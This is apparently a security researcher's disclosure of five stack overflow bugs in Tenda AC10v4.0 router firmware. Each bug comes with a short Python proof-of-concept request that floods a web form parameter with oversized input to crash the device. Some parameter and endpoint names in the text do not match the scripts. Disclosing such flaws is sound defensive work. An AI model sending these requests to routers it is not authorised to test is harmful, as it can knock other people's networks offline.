# Overview



- Firmware download website: https://www.tendacn.com/download/detail-4789.html

# Affected version



AC10v4.0 CE  Firmware V16.03.10.09 which is latest

![image-20240705143523966](C:\Users\PC123\AppData\Roaming\Typora\typora-user-images\image-20240705143523966.png)

# Vulnerability details

**All experiments were conducted under AC10v4.0 CE Firmware V16.03.10.09**

## stack overflow vulnerability

### 1.in setSchedWifi function

the schedEndTime parameter is not restricted



![image-20240705143617895](C:\Users\PC123\AppData\Roaming\Typora\typora-user-images\image-20240705143617895.png)

```
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/openSchedWifi"
payload = b"a"*1000

data = {"schedWifiEnable":0,"schedStartTime": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240705143753793](C:\Users\PC123\AppData\Roaming\Typora\typora-user-images\image-20240705143753793.png)



### 2.in saveParentControlInfo function

The issue involves both the `deviceId` and `deviceName` parameters sharing the same storage space. Additionally, the lack of size limitation on `deviceId` has led to a stack overflow

![image-20240706153435163](C:\Users\PC123\AppData\Roaming\Typora\typora-user-images\image-20240706153435163.png)

![image-20240706153413463](C:\Users\PC123\AppData\Roaming\Typora\typora-user-images\image-20240706153413463.png)

```
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/saveParentControlInfo"
payload = b"a"*1000

data = {"time": "10.30","deviceId": payload,"deviceName":"shit"}
response = requests.post(url, data=data)
print(response.text)
```

### 3.in saveParentControlInfo function 

In the `saveParentControlInfo` function, `set_device_name` is not returned, allowing unrestricted setting of `deviceId`. Similarly, in the `get_parentControl_list_Info` method, insufficient size limitations on the `time` parameter result in stack overflow

![image-20240706154437870](C:\Users\PC123\AppData\Roaming\Typora\typora-user-images\image-20240706154437870.png)

![image-20240706154035704](C:\Users\PC123\AppData\Roaming\Typora\typora-user-images\image-20240706154035704.png)



![image-20240706154347065](C:\Users\PC123\AppData\Roaming\Typora\typora-user-images\image-20240706154347065.png)



```
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/saveParentControlInfo"
payload = b"a"*1000

data = {"time": payload,"deviceId": "payload","deviceName":"shit"}
response = requests.post(url, data=data)
print(response.text)
```

### 4.in formSetQosBand function 

In the `formSetQosBand` function, the `set_qosMib_list` function is called without size limitation on the `list` parameter, leading to a stack overflow

![image-20240706155011513](C:\Users\PC123\AppData\Roaming\Typora\typora-user-images\image-20240706155011513.png)



![image-20240706155054454](C:\Users\PC123\AppData\Roaming\Typora\typora-user-images\image-20240706155054454.png)

![image-20240706155803007](C:\Users\PC123\AppData\Roaming\Typora\typora-user-images\image-20240706155803007.png)

```
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/SetNetControlList"
payload = b"a"*2000

data = {"list": payload}
response = requests.post(url, data=data)
print(response.text)
```



### 5.in fromSetSysTime function 

In the `fromSetSysTime` function, a call to the `sub_4B2058` method uses a `timeZone` parameter without size constraints, resulting in a stack overflow

![image-20240706155532589](C:\Users\PC123\AppData\Roaming\Typora\typora-user-images\image-20240706155532589.png)

![image-20240706155557252](C:\Users\PC123\AppData\Roaming\Typora\typora-user-images\image-20240706155557252.png)



![image-20240706155420044](C:\Users\PC123\AppData\Roaming\Typora\typora-user-images\image-20240706155420044.png)

```
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/SetSysTimeCfg"
payload = b"a"*2000

data = {
        'timeType':'sync',
        'timeZone':payload,
    }
response = requests.post(url, data=data)
print(response.text)
```

